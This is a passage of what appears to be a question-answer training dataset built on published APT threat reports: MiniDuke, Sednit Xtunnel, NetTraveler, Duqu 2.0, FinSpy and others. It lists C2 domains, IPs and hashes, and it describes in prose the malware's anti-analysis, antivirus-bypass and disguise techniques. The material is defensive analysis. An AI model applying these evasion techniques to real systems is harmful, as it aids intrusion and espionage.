17:28:11 2012\". The number \"1109821546\" in the filename refers to the unique victim ID. In this case, we were able to determine that the victim is based in Portugal.\nThe backdoor connects to the following C2 for instructions:\nnews[dot]grouptumbler[dot]com/news/feed.php IP: 200.63.46.23\nIt supports several commands, such as copy file, move file, remove file, make directory, kill process and of course, download and execute new malware.\nThe server at 200.63.46.23 is hosted in Panama:\nWe presume that it was hacked by the attackers and is currently used as a command server for the attacks.\nMD5 hashes for the known \"Stage 3\" backdoors:\nIn addition to the ~300K \"stage 3\" backdoors, we've observed a 13K module (MD5: 6bc34809e44c40b61dd29e0a387ee682).This module will connect to an IP in Turkey, get the response, decrypt it in memory and execute it. The C2 is:\n85.95.236.114\nThe module has a compilation timestamp of \"Tue Nov 13 14:30:12 2012\".\nMedium Headline: Map of victims\nThe C2s maintain a detailed, encoded log of the victims connecting to the servers. The logs are available to anyone who knows the exact filename. By collecting the logs from all the known command servers, we've discovered connections from several high profile networks belonging to:\nBy analyzing the logs from the command servers, we have observed 59 unique victims in 23 countries: Belgium, Brazil, Bulgaria, Czech Republic, Georgia, Germany, Hungary, Ireland, Israel, Japan, Latvia, Lebanon, Lithuania, Montenegro, Portugal, Romania, Russian Federation, Slovenia, Spain, Turkey, Ukraine, United Kingdom and United States. The amount of high profile victims in this attack is notable and puts it on the same level with other advanced campaigns such as \"Red October\".\nAnswer this question: What techniques does the MiniDuke backdoor use to avoid detection and analysis, and how effective are these methods?",
    "output": "The MiniDuke backdoor uses several techniques to avoid detection and analysis. It checks for the presence of various security tools and virtual machines, and if any are detected, it continues running without decrypting further code or exhibiting additional functionality. This approach helps the malware evade automated analysis and remain undetected. Additionally, the backdoor uses position-independent code and resolves API function addresses by hash values, making it harder to analyze statically.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: TLS Encryption (April 2014)\nA major feature introduced in April 2014 is the encryption of the communications with the C&C server with the Transport Layer Security (TLS) protocol (<>)[25]. These new Xtunnel binaries are statically linked with OpenSSL 1.0.1e \u2014 a version released in February 2013. Inside the TLS encapsulation, Xtunnel network protocol for tunneling remains the same (including the RC4 encryption).\nThe TLS certificate used by the C&C server is not verified by Xtunnel, which means anyone could play the role of Xtunnel C&C server.\nSmall Headline: HTTP Proxy Connection (February 2015)\nSome organizations force their computers to pass through an HTTP proxy to access the Internet. Malware running on such machines therefore cannot contact the C&C server directly, but has to pass through the proxy. Sednit developers took that into account by creating special Xtunnel versions with HTTP proxy awareness.\nIn these binaries, Xtunnel first tries to retrieve the Internet Explorer proxy configuration by calling the Windows API function WinHttpGetIEProxyConfigForCurrentUser (<>)[26]. In the event that no information can be retrieved, it uses the hardcoded address 10.1.1.1:8080, which is the default address of the Squid caching proxy (<>)[27]. This intention is clearly stated in the PDB path in one of the samples: xaps_through_squid_default_proxy.\nOnce a proxy IP address has been chosen, Xtunnel uses the HTTP CONNECT method (<>)[28] to reach its C&C server.\nSmall Headline: Command Line Parameter Parser (April 2015)\nTo gain in flexibility and manage novel features, in April 2015 Xtunnel developers introduced a command line parameter parser. This parser accepts the parameters described in Table 5.\nTable 5. Xtunnel Parameters\nIn most Xtunnel samples, the parser actually processes a command line hardcoded in the binary, without even looking for input parameters. Here are some examples of such command lines found in some samples:\nThe proxy IP addresses shown in these examples do not correspond to any known default proxy address, indicating that these binaries were likely compiled for specific targets.\nSmall Headline: HTTP Persistent Connection (June 2015)\nIn June 2015, a novel way to connect to the C&C server was introduced: an HTTP persistent connection (<>)[29]. When this feature is enabled, Xtunnel exchanges data with its C&C server over the HTTP protocol (encapsulated in TLS protocol), probably as a way to bypass firewalls.\nTo open such a persistent connection, an HTTP GET request is encapsulated in TLS protocol and sent to the C&C server. This request comes with the HTTP header Connection: keep-alive to enable the persistent connection.\nAnother HTTP request header hardcoded in Xtunnel is Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4, which interestingly contains the language code ru-RU. This header may have been copied from a request made from a computer whose default language is Russian.\nSmall Headline: Code Obfuscation (July 2015)\nIn July 2015, Xtunnel binaries changed drastically from a syntactic point of view, due to the introduction of code obfuscation. This obfuscation was applied only to Xtunnel-specific code, while statically linked libraries were left untouched. The method employed is a mix of classic obfuscation techniques, like insertion of junk code and opaque predicates (<>)[30].\nConsequently, Xtunnel binaries are now about 2 MB in size, while the previous non-obfuscated versions were about 1 MB with most of that being the statically linked OpenSSL library. The obfuscated version is, of course, much harder to understand and, to illustrate that, the following Figures show the control flow graph (CFG) (<>)[31] of a small Xtunnel function, before and after obfuscation.\nWhile the control flow has been heavily obfuscated, strangely the strings and data are kept in plain text. We speculate that the developers applied an (unknown) code obfuscation tool, which was enough to achieve their goal \u2014 probably bypassing some security products.\nMedium Headline: Conclusion and Open Questions\nWe believe Xtunnel to be of high importance to the Sednit operators, despite the questionable quality of the code as we discussed in the analysis. In particular, it is the only Sednit component we know with heavy code obfuscation. Additionally, the numerous features added over the last three years indicate an ongoing development effort.\nFinally, we would like to stress that our analysis is solely based on the capabilities found in the binaries. In particular, we do not have in-the-wild examples on how Xtunnel is deployed, and what kind of network traffic is usually forwarded.\nBig Headline: ClOSInG REMaRkS\nIn order to perform its espionage activities, the Sednit group mainly relies on two backdoors, Xagent and Sedreco, which were intensively developed over the past years. Similarly, notable effort has been invested into Xtunnel, in order to pivot in a stealthy way. Overall, these three applications should be a primary focus to anyone wanting to understand and detect the Sednit group's activities.\nNevertheless, the spying and pivoting capabilities of Sednit are not limited to the software described in this second part of our whitepaper. For example, they regularly deploy the following on target computers:\n\u2022 Password retrieval tools for browsers and email clients; some of these tools are custom, while others are publicly available (like the SecurityXploded tools (<>)[32])\n\u2022 Windows password retrieval tools, with custom builds of the infamous mimikatz (<>)[33] and some custom tools\n\u2022 A custom tool to take regular screenshots of the target computer\nMoreover, the Sednit group created numerous small executables to perform specific tasks, like copying or removing files. The developers seem therefore to closely follow the operational needs of the group, causing us to speculate that they are not outsiders paid for a one-time job, but fully-fledged members of the group.\nBig Headline: REfEREnCES\n1. The Washington Post, Russian government hackers penetrated DNC, stole opposition research on Trump, (<https://www.washingtonpost.com/world/national-security/russian-government-hackers-penetrated-dnc-stole-opposition-research-on-trump/2016/06/14/cf006cb4-316e-11e6-8ff7-7b6c1998b7a0_story.html?hpid=hp_rhp-banner-main_dnc-hackers-1145a-banner%3Ahomepage%2Fstory,>), June 2016\n2. The Wall Street Journal, Germany Points Finger at Russia Over Parliament Hacking Attack, , May 2016\n3. Reuters, France probes Russian lead in TV5Monde hacking: sources, -france-russia-cybercrime-idUSKBN0OQ2GG20150610, June 2015\n4. ESET VirusRadar, Zero-day, -day\n5. ESET, Sednit Espionage Group Attacking Air-Gapped Networks, , November 2014\n6. Kaspersky, Sofacy APT hits high profile targets with updated toolset, -apt-hits-high-profile-targets-with-updated-toolset/, December 2015\n7. CrowdStrike, Bears in the Midst: Intrusion into the Democratic National Committee, -midst-intrusion-democratic-national-committee/, June 2016\n8. Trend Micro, Pawn Storm Espionage Attacks Use Decoys, Deliver SEDNIT, , October 2014\n9. FireEye, APT28: A Window into Russia's Cyber Espionage Operations?,\n10. GitHub, ESET Indicators of Compromises,\n11. ESET, Sednit espionage group now using custom exploit kit, , October 2014\n12. Microsoft Developer Network, Run-Time Type Information,\n13. Trend Micro, Pawn Storm Update: iOS Espionage App Found, -storm-update-ios-espionage-app-found/, February 2015\n14. 15. SQLite, SQLite, /\n16. Wikipedia, Cyclic redundancy check,\n17. W3C, The Multipart Content-Type,\n18. Microsoft Developer Network, How to Implement Icon Overlay Handlers, (v=vs.85).aspx\n19. Microsoft Developer Network, SYSTEMTIME structure, (v=vs.85).aspx\n20. Wikipedia, Lempel\u2013Ziv\u2013Welch, %E2%80%93Ziv%E2%80%93Welch\n21. 4coder, LZW Algorithm Implementation, /\n22. 23. Spiegel, Cyberangriff auf das Parlament: Bundestag best\u00e4tigt Abfluss von E-Mail-Daten, , June 2015\n24. PDB Files,\n25. Internet Engineering Task Force, The Transport Layer Security (TLS) Protocol,\n26. Microsoft Developer Network, WinHttpGetIEProxyConfigForCurrentUser function, (v=vs.85).aspx\n27. Squid, Home Page, /\n28. Wikipedia, HTTP CONNECT tunneling, #HTTP_CONNECT_tunneling\n29. Wikipedia, HTTP persistent connection,\n30. Wikipedia, Opaque predicate,\n31. Wikipedia, Control flow graph,\n32. SecurityXploded, Home Page, /\n33. mimikatz, GitHub page,\nLast updated 2016-09-07 19:38:00 EDT\n\nHow did the Sednit group modify Xtunnel in June 2015 to potentially bypass firewalls, and what additional clue did they leave behind regarding their possible origin?",
    "output": "A: In June 2015, the Sednit group introduced a feature in Xtunnel to establish an HTTP persistent connection with the C&C server. This connection is encapsulated in the TLS protocol and uses the HTTP GET request with the header 'Connection: keep-alive' to maintain the persistent connection, likely as a method to bypass firewalls. Additionally, another HTTP request header hardcoded in Xtunnel is 'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4', which includes the language code 'ru-RU'. This suggests that the request might have been copied from a computer whose default language is Russian, providing a clue about the possible origin of the Sednit group.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Overview\nThroughout 2016, Proofpoint researchers tracked a cyber-espionage campaign targeting victims in Russia and neighboring countries. The actor utilizes spear phishing campaigns to deliver NetTraveler, also known as TravNet. First observed as early as 2004, NetTraveler is a Trojan used widely in targeted attacks. We believe that this attacker operates out of China. In addition to Russia, targeted regions include neighboring countries such as Mongolia, Belarus, and other European countries. The spear-phishing campaigns we detected use links to RAR-compressed executables and Microsoft Word attachments that exploit the (<http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-0158>)CVE-2012-0158 vulnerability.\nThis particular APT is targeting organizations that include weapons manufacturers, human rights activists, and pro-democracy groups, among others.\nBig Headline: Spear-Phishing\nOne of this actor's favorite techniques is to register news and military lookalike sites and use them for Command and Control (C&C) and for payload hosting. Days prior to launching a wave of spear-phishing, the actor selects a victim-relevant news topic such as nuclear energy, military training, or geopolitics. The actor then finds a news article on the topic and uses it as a basis for the phishing lure, including file names, relevant decoy documents, image files, and email content.\nFor example, the actor emailed the URL www.info-spb[.]com/analiz/voennye_kommentaria/n148584.rar to potential victims in early February. The URL links to a RAR file which contains the executable \"\u041d\u0430\u043f\u0430\u0434\u0435\u043d\u0438\u0435 \u043d\u0430 \u0430\u043c\u0435\u0440\u0438\u043a\u0430\u043d\u0441\u043a\u0438\u0435 \u043a\u043e\u0441\u043c\u0438\u0447\u0435\u0441\u043a\u0438\u0435 \u0441\u0438\u0441\u0442\u0435\u043c\u044b \u043e\u0447\u0435\u043d\u044c \u0434\u043e\u0440\u043e\u0433\u043e \u043e\u0431\u043e\u0439\u0434\u0435\u0442\u0441\u044f.scr\" (\"Attacking the American space systems will be very costly.scr\") and two benign decoy documents. One of these documents is shown in Figure 1 below:\nFigure 2 shows the legitimate news story that served as the basis for the spear-phishing lure.\nThe RAR archives hosted on look-alike domains always contain RAR SFX-packaged executables that drop and load NetTraveler. A sampling of the various filenames used for executables is provided below:\nBig Headline: Indicators of Compromise (IOC)\nIn some cases, instead of sending URLs in the spear-phishing emails, the attackers sent Microsoft Word attachments utilizing CVE-2012-0158 to exploit the client and install NetTraveler. These documents were built with MNKit, described in detail here [4] [6]. For example, the attachment \"\u041f\u041b\u0410\u041d \u0420\u0415\u0410\u041b\u0418\u0417\u0410\u0426\u0418\u0418 \u041f\u0420\u041e\u0415\u041a\u0422\u0410.doc\" (which translates to \"Plan of realization of project.doc\") was sent to potential victims in January 2016. As shown in Figure 3, various builder artifacts are visible in the document indicating the use of a builder.\nBig Headline: Other Targeted Countries\nBesides targeting Russia with NetTraveler, the actor also appears to have interests in Mongolia. While we do not have spear-phishing emails for these samples, we found certain payloads using Mongolian lures and decoys. For example, the file 13_11.rar found on March 11 contains a NetTraveler payload with a Mongolian file name \"\u041d\u0418\u0419\u0413\u041c\u0418\u0419\u041d \u0414\u0410\u0410\u0422\u0413\u0410\u041b\u042b\u041d \u0415\u0420\u04e8\u041d\u0425\u0418\u0419 \u0413\u0410\u0417\u0410\u0420.exe\" (\"Social Insurance General Gazar.exe\") and a decoy PDF file with the same name. The C&C for this sample, www.mogoogle[.]com, resolved to the IP address 103.231.184[.]164, where the last octet of the IP is only 1 number larger than the IP address used for NetTraveler payloads with Russian targeting.\nAnother sample found April 20 with a Russian filename \"\u0413\u043b\u0430\u0432\u043d\u044b\u0439 \u0440\u0435\u0434\u0430\u043a\u0442\u043e\u0440 Sputnik\u2013\u0422\u0443\u0440\u0446\u0438\u044f \u0432 \u0441\u0440\u0435\u0434\u0443 \u0432\u0435\u0440\u043d\u0435\u0442\u0441\u044f \u0432 \u041c\u043e\u0441\u043a\u0432\u0443.rar\" (\"Main editor of Sputnik-Turkey will return to Moscow on Wednesday.doc.scr\") containing a NetTraveler payload with a decoy JPG file. The image file is a picture of a Turkish-language \"Unacceptable forms of passenger information\" form. This sample reuses the C&C domain www.mogoogle[.]com. The decoy in this sample was based on an RIA (a Russian language news agency) news article that appeared on the same day describing how the editor for the Turkish branch of a major Russian news source, Sputnik, was not allowed to enter Turkey during the height of the Russia-Turkey plane-downing dispute [7]. This payload could have been sent to Russian or Turkish individuals.\nAnother sample found on March 13 included a Russian file name \"\u0421\u043e\u0432\u043c\u0435\u0441\u0442\u043d\u043e\u0435 \u0430\u043d\u0442\u0438\u0442\u0435\u0440\u0440\u043e\u0440\u0438\u0441\u0442\u0438\u0447\u0435\u0441\u043a\u043e\u0435 \u0443\u0447\u0435\u043d\u0438\u0435 \u00ab\u0410\u043d\u0442\u0438\u0442\u0435\u0440\u0440\u043e\u04402016\u00bb.rar\" (\"Joint anti-terrorism training \"Antiterror 2016\".scr\") and contains a NetTraveler payload with C&C www.voennovosti[.]com. The file name for this sample capitalizes on a Belarusian news article [8] describing anti-terror exercises in Minsk, Belarus, by participating Commonwealth of Independent States countries (CIS). This payload could have been sent to a national of participating countries such as Belarus, Russia, or Ukraine.\nBig Headline: Infrastructure\nThe following table summarizes the C&C and payload hosting domains used throughout the year.\nAll the domains (except mogoogle[.]com) were set up with the same registrar in Beijing referred to as \"Shanghai Meicheng Technology Information Development Co., Ltd.\". Other than the emails, information used for registration was randomized. On the infrastructure side, the similarities to the 2015 PlugX campaign we described in \"In Pursuit of Optical Fibers and Troop Intel: Targeted Attack Distributes PlugX in Russia\" include:\nRegistration using \"Shanghai Meicheng Technology Information Development Co., Ltd.\"\nUse of 4 - 6 letter Yahoo or Gmail registrant accounts\nUse of fake C&C domains that mimic major news sites or military forums\nIP address 98.126.38[.]107 resolved to domains used in both 2015 (including patriotp[.]com) and 2016 campaigns (such as www.voennovosti[.]com)\nBig Headline: NetTraveler Analysis\nNetTraveler implants continue to use a DLL side-loading technique. The payloads described here used the clean, signed executable fsguidll.exe (F-secure GUI component) to sideload fslapi.dll or the clean, signed executable RasTls.exe to sideload rastls.dll.\nThe configuration file used by NetTraveler uses a known format. For example, the payload dropped by 20160623.doc (See IOC table) uses the following configuration, where U00P is a C&C server, K00P is a DES key composed of a string of repeated As, P00D is sleep time, and F00G is proxy setting. U00P and K00P are encrypted in the file using a simple algorithm. These values are contained in the dropped config.dat file. Additionally, MM1 through MM6 parameters (not shown below) are added after installation.\nBig Headline: Conclusion\nThreat actors have been successfully using NetTraveler for cyber-espionage for over 10 years. Targets have ranged from government agencies to nuclear power installations. In this case, it appears that Chinese actors are targeting a variety of interests in Russia and neighboring countries, relying on spear-phishing attacks to drop NetTraveler on vulnerable machines. Regardless of the TTPs, this ongoing APT points to the staying power of NetTraveler and the need for ongoing vigilance and technological protections against advanced persistent threats. Even organizations without direct government ties are potential targets for these types of attacks as smaller agencies or contractors can serve as beachheads in larger campaigns against indirectly related targets.\n\nBased on the above text, answer a question. What techniques does the NetTraveler APT use to deliver its payloads, and why might these methods be effective against specific targets?",
    "output": "The NetTraveler APT uses spear-phishing campaigns to deliver its payloads. The techniques involve registering news and military lookalike sites for Command and Control (C&C) and payload hosting. The actor selects a victim-relevant news topic and uses it as a basis for the phishing lure, including file names, relevant decoy documents, image files, and email content. This method is effective because it leverages current events and topics that are likely to interest the target, making them more likely to engage with the phishing email.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: ORACLE MICROS COMPROMISE NOTIFICATION\nDistribution: Issuers, Acquirers, Processors and Merchants\nSummary: On Monday, 8 August 2016, Oracle Security informed Oracle MICROS customers that it had detected malicious code in certain legacy MICROS systems. Oracle is currently investigating the compromise, and as of 12 August 2016, the company has not published details about the cause/s.\nVisa is issuing this alert to provide indicators of compromise (IOCs) associated with cybercrime threats known to have previously targeted Oracle systems.\n\nIn the context of the ORACLE MICROS compromise notification issued in August 2016, why was it crucial for Oracle to inform its customers about the detection of malicious code in certain legacy MICROS systems? Additionally, how might cybersecurity experts leverage the indicators of compromise (IOCs) provided by Visa to enhance their defense strategies against similar threats?",
    "output": "It was crucial for Oracle to inform its customers about the detection of malicious code in certain legacy MICROS systems because transparency and timely communication are essential in managing security incidents. By notifying customers, Oracle allowed them to take immediate action to mitigate potential risks and protect their systems. Cybersecurity experts can leverage the indicators of compromise (IOCs) provided by Visa to enhance their defense strategies by using these IOCs to identify and respond to similar threats. They can update their threat intelligence feeds, refine their intrusion detection systems, and implement proactive measures to prevent future compromises. This information helps in understanding the tactics, techniques, and procedures (TTPs) used by attackers, enabling experts to strengthen their security posture and better protect their organizations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the DUBNIUM malware disguise itself to appear legitimate, and what specific tactics does it employ to achieve this?",
    "output": "The DUBNIUM malware disguises itself as a Secure Shell (SSH) tool, specifically a certificate generation tool. It achieves this by having file descriptions and properties that appear convincingly legitimate at first glance. When executed, the program dumps out dummy certificate files into the file system, adding to its deceptive nature. Additionally, the binary is statically linked with the OpenSSL library, making it look like a genuine SSH tool. This tactic involves having more than 2,000 functions, most of which are statically linked to OpenSSL code without symbols, complicating reverse engineering efforts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Third Layer: klif.dll\nOriginal filename: klif.dll\nMD5: 3fde1bbf3330e0bd0952077a390cef72\nSize: 196'096 bytes\nLink time: 2014.07.06 08:36:50 (GMT)\nType: 64-bit PE32+ executable DLL for MS Windows\nApparently, this file attempts to mimic some of legitimate names of Kaspersky Lab product components: \"klif.sys\". Although there is neither similarity in code nor in file information, the module uses Kaspersky Lab acronym in it's export names: KLInit and KLDone.\nWhen this DLL is loaded into a new process, it simply initializes internal structures, such as those providing pointers to the required system API.\nThe real payload of this module is located in the KLDone export function, which is second in the list of the export table. This export function is called from the previous code layer.\nFirst, it makes sure that global application structure is initialized with essential functions from ntdll.dll, kernel32.dll and user32.dll. System API functions are imported using hashes of export names. The hashing algorithm is identical to the one described one layer above and uses the same magic constants:  0x8A20C27 and 0x67F84FC6.\nNext the code iterates through the list of running processes and hashes lowercase name of each process. The hash is compared to a hardcoded value of 0x3E3021CB, which is a hash for the \"avp.exe\" string.\nMedium Headline: Attacking AVP.EXE\nIf the \"avp.exe\" process is running, the module attempts to open the OSBoot-section as described before and tries to attack the avp.exe process. The attack starts from identifying the exact path to the installed Kaspersky Lab product by iterating through an array of hardcoded registry keys and values for the following products:\nThe registry values queried by the module contain a filesystem path to the root directory where the corresponding product is installed. For example: \"C:\\Program Files\\Kaspersky Lab\\Kaspersky Internet Security 15.0.0\\\"\nOnce the registry key and value is found, the module confirms that avp.exe file is located in that directory. It does some basic file availability checks as well: makes sure that environment variables are resolved and the file can be opened for reading and it begins with 0x5A4D (magic \"MZ\" value of Windows executables).\nAfter that, the module creates a new section and maps avp.exe as a file view to this section. To allow code execution, the attributes of this memory region are also changed accordingly. This allows the module to change bytes from the mapped avp.exe in memory. The module applies two patches to the mapped avp.exe in a quite unusual way using SSE2 CPU extensions. In fact, it patches just the old DOS PE header (less than 120 bytes). The patches are simple callback mechanisms that call arbitrary function passed as an argument.\nRight after this, the module attempts to start a new thread that begins with one of the patched locations. So far, it looks like the new thread begins with a call originating from avp.exe module that does some other calls, i.e. jumping back to klif.dll. Apparently, this\nattack was introduced to trick the avp.exe process into believing that further calls will be safe and trusted as the root of the call stack is coming from the legitimate avp.exe module.  This is what we see further down in the code: the new thread instantly jumps from avp.exe back to klif.dll and tries to communicate with the Kaspersky Lab product minifilter driver, known as klif.sys.\nIn fact, just before communicating with klif.sys, it opens OSBoot-section and gets an IOCTL code as well as the driver device name to send this IOCTL code to. The section and corresponding driver (KMART.dll) provide certain support to the current module. The code hashes current process name and verifies if it falls down into one of three hashes:  0x3E3021CB (avp.exe), 0xDE6D4DA0 (msiexec.exe), 0xB915B2D8 (rundll32.exe).\nIf current process name hash is recognized, the module communicates with klif.sys by opening \\KlifComm minifilter communication port and sending series of driver communication messages. According to analysis of the messages, this technique makes process or thread operations \"invisible\" to the klif interceptor. Such registered entity is considered to be trusted and its activity is removed from AV-scanning, process monitoring, firewall and other defense engines that are subscribed to intercepted events. In addition, the module requests support of the self-defense feature of Kaspersky Lab product, which is normally used to protect the software from aggressive malware which kills the security software processes using a number of techniques available from the OS. This of course guarantees that even a user with administrative privileges cannot stop such process.\nConsidering that this seemed to be an attack against Kaspersky Lab products, we did some additional tests of the products and found that current products verify the caller process by checking its custom digital signature. So far, without additional driver support, this technique should fail. Verification of the digital signature of the process that opened \\KlifComm minifilter communication port was implemented in all Kaspersky Lab products since 2010. So far, this could affect only older products such as KIS2010, which was released by Kaspersky Lab in 2009 \u25ba\nIt doesn't look realistic now that the attackers started implementing tricks against Kaspersky Lab products in 2009 or earlier. So we looked for another rational explanation and seem to have found it.\nSuch an attack doesn't normally work against our products because they verify that the caller process is legitimate by checking its custom digital signature. To bypass this, the Duqu 2.0 component named \"KMART.dll\" patches \"klif.sys\" in memory to bypass this check. The attack works because the attacker's \"KMART.dll\" is already running in kernel mode due to a vulnerability in the Windows kernel.\nAfter sending the codes, the module proceeds to the next stage, which is process migration, described further below.\nMedium Headline: CTwoPENC.dll zero-day and KMART.dll\nThe third layer klif.dll performs a multitude of functions in order to ensure the survival of the malware in memory and bypass antivirus detections.\nOne important step is to get kernel level access. On 64-bit systems, one cannot simply load and run kernel mode code without a signed driver. While other attackers such as Equation or Turla chose to piggyback on third-party signed drivers, the Duqu 2.0 platform relies on a much more cunning trick.\nOne of the payloads bundled together with \"klif.dll\" is called \"CTwoPENC.dll\". This is aWindows kernel mode exploit (CVE-2015-2360) that allows them to run code with the highest privileges in the system We recovered several versions of \"CTwoPENC.dll\", both for 32-bit and 64-bit versions of Windows, with the following compilation timestamps:\n\u2022 2014.08.25 01:20:04 (GMT)\n\u2022 2014.08.25 01:19:03 (GMT)\n\u2022 2014.07.06 09:17:03 (GMT)\nUnlike other Duqu 2.0 modules, these timestamps appear to be legitimate. The reason for this remains unknown \u2013 perhaps the Duqu platform developers got this module from somebody else and forgot to patch its compilation timestamp.\n\"CTwoPENC.DLL\" exploits a zero-day vulnerability in \"win32k.sys\" to gain kernel privileges while being run as an unprivileged user. It creates several windows with classes named \"CPer\", \"Zero\", \"CTwo\", \"Vero\" in several threads and manipulates the callback pointers.\nPart of the exploit code that registers window classes and creates new windows.\nThe main purpose of the exploit is to load a driver named \"KMART.dll\". If the exploit succeeds, it decompresses \"KMART.dll\" from the module's body and passes control\nto it while running in kernel mode. Both 32-bit and 64-bit versions of the \"KMART. DLL\" exist. This driver implements a kernel-mode attack against the Kaspersky Lab products filter \"klif.sys\". It patches the import table addresses of system API functions PsGetCurrentProcessId, PsLookupProcessByProcessId and KlGetStringRef export of Kaspersky Lab's anti-virus driver klflt.sys. The intercepted functions are preceded by malicious code that impersonates the other malicious modules as coming from the process/file \"avp.exe\" (using the actual location of the anti-virus component), thus evading monitoring by the anti-virus software.\nDuring testing, the zero-day exploit worked on all contemporary Windows versions (XP, Vista, 7, 8, 8.1 both 32-bit and 64-bit). This vulnerability has been patched by Microsoft on June 9, 2015.\"\nBig Headline: PAYLOAD CONTAINERS AND MIGRATION\nThe module supports a number for different payloads provided in the form of containers following klif.dll in memory (located in PE overlay).\nA payload container contains a short header describing target CPU architecture, payload type and target process name or hash. When the module uses some embedded code or file there is normally at least two variants of code bundled inside: 32 and 64-bit. Each payload run type is identified by a single character. Current module supports the following 5 payload run types: g, i, k, l, q. Seems like the developer used ordered alphabet characters, which means that there could be other payload run types which were removed from the code at some time. Currently the container located in the overlay of subject executable contains a \"l\" character as a payload run type, so lets describe it first.\n\nHow does the Duqu 2.0 malware module 'klif.dll' attempt to mimic legitimate Kaspersky Lab product components and what are the specific methods it uses to initialize its payload?",
    "output": "The Duqu 2.0 malware module 'klif.dll' attempts to mimic legitimate Kaspersky Lab product components by using names similar to Kaspersky Lab's, such as 'klif.sys'. It includes export names like 'KLInit' and 'KLDone'. When this DLL is loaded into a new process, it initializes internal structures that provide pointers to required system APIs. The real payload is located in the 'KLDone' export function, which ensures that the global application structure is initialized with essential functions from 'ntdll.dll', 'kernel32.dll', and 'user32.dll'. System API functions are imported using hashes of export names, employing a hashing algorithm with specific magic constants: 0x8A20C27 and 0x67F84FC6.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What are the key functionalities of the zwShell command and control (C&C) server in the context of the Night Dragon attacks, and how do these functionalities facilitate the monitoring and control of compromised systems?",
    "output": "The zwShell C&C server provides several key functionalities that facilitate the monitoring and control of compromised systems. These include the ability to create custom Trojans, launch the C&C server by specifying a port and password, configure server settings such as listening port, encryption password, sound notifications, and remote access color depth. Additionally, the attacker can specify the RAT DLL details, C&C hostnames or IP addresses, and dropper EXE process icon. Once a client connects, the attacker can establish full remote control, browse the file system, launch command-line shells, manipulate the registry, view the remote desktop, and uninstall the Trojan from the client. These functionalities enable the attacker to effectively manage and exfiltrate data from multiple compromised systems.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the attackers in the FinSpy campaign attempt to disguise the malicious executable files, and what was the significance of the Unicode right-to-left override (RLO) character in this context?",
    "output": "The attackers in the FinSpy campaign attempted to disguise the malicious executable files by embedding a Unicode right-to-left override (RLO) character in the filenames. This caused Windows to render the filename backwards, making it appear as an image file (e.g., gpj.1bajaR.exe displayed as exe.Rajab1.jpg). The significance of the RLO character was to trick users into believing they were opening a harmless image file, thereby increasing the likelihood that they would execute the malicious file.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Conclusion and Open Questions\nOver the last year, Seduploader became the most-used first-stage malware of the Sednit group. During this time, this component has been under intense development, for example by adding persistence methods to the dropper, or improving the payload's ability to contact its C&C server.\nThe purpose of Seduploader is twofold. First, it serves to establish a network link between the compromised machine and the C&C server, bypassing possible network security measures. Second, it serves to check that the infected computer belongs to an intended target (and in particular, does not belong to a security researcher).\nWe do not know the exact logic used to select certain computers as being interest. We speculate that Sednit operators know quite precisely the target's environment in many cases, because they had already infected computers belonging to the same organization in the past. Hence the simple Seduploader report is informative enough to select real targets.\nBig Headline: CloSIng REMARkS\nThe attack methods and malware described in this first part of our whitepaper demonstrate the technical abilities and the review of the literature of the Sednit group. For example, the group revamped the 0-day exploits from the Hacking Team data leak only a few days after their release, created a brand new exploit for the CVE-2014-6332 vulnerability based on a presentation at the BlackHat conference, and regularly integrated novel persistence methods into Seduploader.\nThe attack methods of the Sednit group are not limited to those described in this whitepaper. In particular, we know from several investigations that they have:\n\u2022 Trojanized some legitimate private applications used in some Eastern European embassies, so that the employees would be infected with spying malware when running the modified executable\n\u2022 Hacked into some Linux servers using a known vulnerability for WordPress\n\u2022 Hacked into some Zimbra webmail servers using a known vulnerability\nOverall, the Sednit group is always looking for new ways to approach its targets, both with opportunistic strategies and by developing its own original methods.\nBig Headline: References\n1. The Washington Post, Russian government hackers penetrated DNC, stole opposition research on Trump, , June 2016\n2. The Wall Street Journal, Germany Points Finger at Russia Over Parliament Hacking Attack, , May 2016\n3. Reuters, France probes Russian lead in TV5Monde hacking: sources, , June 2015\n4. ESET VirusRadar, Zero-day,\n5. -\nESET, Sednit Espionage Group Attacking Air-Gapped Networks, http://www.welivesecurity.com/2014/11/11/sednitespionage-group-attacking-air-gapped-networks/, November 2014\n6. Kaspersky, Sofacy APT hits high profile targets with updated toolset, , December 2015\n7. CrowdStrike, Bears in the Midst: Intrusion into the Democratic National Committee, , June 2016\n8. Trend Micro, Pawn Storm Espionage Attacks Use Decoys, Deliver SEDNIT, , October 2014\n9. FireEye, APT28: A Window into Russia's Cyber Espionage Operations?,\n10. GitHub, ESET Indicators of Compromises,\n11. PricewaterhouseCoopers, Tactical Intelligence Bulletin : Sofacy Phishing, , October 2014\n12. Bitly, URL Shortener and Link Management Platform,\n13. Bitly, Sunsetting Your Network and Public Profile Pages, , May 2016\n14. Wikipedia, Moscow Time,\n15. Wikipedia, People's Freedom Party, %27s_Freedom_Party\n16. BuzzFeed, Down The Rabbit Hole With Russia's Mysterious Leakers, https://www.buzzfeed.com/maxseddon/down-the-rabbit-hole-with-russias-mysterious-leakers\n17. Trend Micro, Pawn Storm's Domestic Spying Campaign Revealed; Ukraine and US Top Global Targets, , August 2015\n18. MITRE, CVE-2009-3129,\n19. MITRE, CVE-2010-3333,\n20. 21. MITRE, CVE-2013-2729,\n22. MITRE, CVE-2014-1761,\n23. ESET, Sednit espionage group now using custom exploit kit, , October 2014\n24. MITRE, CVE-2015-1641,\n25. Prevenity, Analiza atak\u00f3w z maja 2016 na instytucje publiczne, (Polish), May 2016\n26. MITRE, CVE-2015-2424,\n27. iSIGHTPARTNERS, Microsoft Office Zero-Day CVE-2015-2424 